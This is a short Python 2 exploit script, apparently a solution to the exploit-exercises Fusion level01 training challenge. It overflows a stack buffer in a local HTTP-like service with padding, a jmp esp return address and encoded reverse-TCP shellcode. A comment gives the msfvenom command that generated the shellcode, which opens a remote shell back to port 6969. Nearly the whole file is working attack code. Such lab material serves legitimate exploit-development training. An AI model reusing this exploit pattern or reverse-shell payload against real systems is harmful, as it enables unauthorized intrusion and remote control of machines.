# exploit-exercises - fusion - level01
# exploit by @vnico
# http://vnico.mundodisco.net
import socket
from struct import pack
HOST = '127.0.0.1'
PORT = 20001
PADDING = 'A' * 139
# /opt/metasploit-framework/msfelfscan -j esp /opt/fusion/bin/level01
# 0x08049f4f jmp esp
RET_ADDRESS = pack('<I', 0x08049f4f)
JUMP = '\xff\xe6'
# /opt/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=127.0.0.1 LPORT=6969 -f c -b '\x00'
SHELLCODE = "\xba\x5f\x4a\x7e\x30\xdb\xcd\xd9\x74\x24\xf4\x58\x2b\xc9\xb1" + \
  "\x12\x31\x50\x15\x03\x50\x15\x83\xe8\xfc\xe2\xaa\x7b\xa5\xc7" + \
  "\xb7\x2f\x1a\x7b\x5d\xd2\x15\x9a\x11\xb4\xe8\xdd\x0a\x67\x9b" + \
  "\xa2\xac\x97\x5a\x3b\xc4\x8c\x65\xa5\x47\xd9\x85\x78\x37\x94" + \
  "\x47\x39\xdd\xc0\xdf\x73\xa1\x54\x67\x52\x11\x59\xaa\xe5\x18" + \
  "\xdf\xcd\xb6\xf2\x30\x01\x44\x6a\x27\x72\xc8\x03\xd9\x05\xef" + \
  "\x83\x76\x9f\x11\x93\x72\x52\x51"
REQUEST = 'GET {0}{1}{2} HTTP/1.1{3}'.format(PADDING, RET_ADDRESS, JUMP, SHELLCODE)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(REQUEST)
data = s.recv(1024)
print data
s.close()
